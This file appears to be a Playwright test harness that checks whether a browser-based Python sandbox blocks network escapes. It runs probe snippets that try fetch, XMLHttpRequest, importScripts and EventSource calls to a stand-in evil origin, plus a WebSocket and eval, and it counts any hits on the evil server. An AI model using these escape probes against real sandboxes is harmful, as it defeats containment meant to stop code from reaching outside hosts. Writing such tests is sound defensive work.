import { webkit, chromium, firefox } from "playwright";
import { start, evilHits, APP_ORIGIN, EVIL_ORIGIN } from "./server.mjs";
const eng = { webkit, chromium, firefox }[process.argv[2] || "webkit"];
const srv = await start();
const browser = await eng.launch();
const page = await (await browser.newContext()).newPage();
await page.goto(`${APP_ORIGIN}/index.html`);
await page.waitForFunction(() => window.api);
await page.evaluate(() => window.api.ready);
const probes = {
  fetchEvil: `import js\ntry:\n    r = await js.fetch("${EVIL_ORIGIN}/fetch"); print("OK", r.status)\nexcept Exception as e:\n    print("BLOCKED", type(e).__name__)`,
  fetchSelf: `import js\nr = await js.fetch("/index.html"); print("OK", r.status)`,
  xhrEvil: `import js\ntry:\n    x = js.XMLHttpRequest.new(); x.open("GET", "${EVIL_ORIGIN}/xhr", False); x.send(); print("OK", x.status)\nexcept Exception as e:\n    print("BLOCKED", type(e).__name__)`,
  ws: `import js\ntry:\n    js.WebSocket.new("ws://127.0.0.1:4300/ws"); print("CREATED")\nexcept Exception as e:\n    print("BLOCKED", type(e).__name__)`,
  importScripts: `import js\ntry:\n    js.importScripts("${EVIL_ORIGIN}/x.js"); print("OK")\nexcept Exception as e:\n    print("BLOCKED", type(e).__name__)`,
  eval: `import js\ntry:\n    js.eval("1+1"); print("OK")\nexcept Exception as e:\n    print("BLOCKED", type(e).__name__)`,
  sse: `import js\ntry:\n    js.EventSource.new("${EVIL_ORIGIN}/sse"); print("CREATED")\nexcept Exception as e:\n    print("BLOCKED", type(e).__name__)`,
};
for (const [k, code] of Object.entries(probes)) {
  const r = await Promise.race([
    page.evaluate((c) => window.api.run(c), code),
    new Promise((res) => setTimeout(() => res({ status: "TIMEOUT" }), 8000)),
  ]);
  console.log(k.padEnd(14), r.status, JSON.stringify(r.output || r.error || "").slice(0, 120));
  if (r.status === "TIMEOUT") { await page.evaluate(() => window.api.stop()); await page.waitForTimeout(500); }
}
await page.waitForTimeout(1000);
console.log("evilHits", JSON.stringify(evilHits));
await browser.close(); await srv.close();
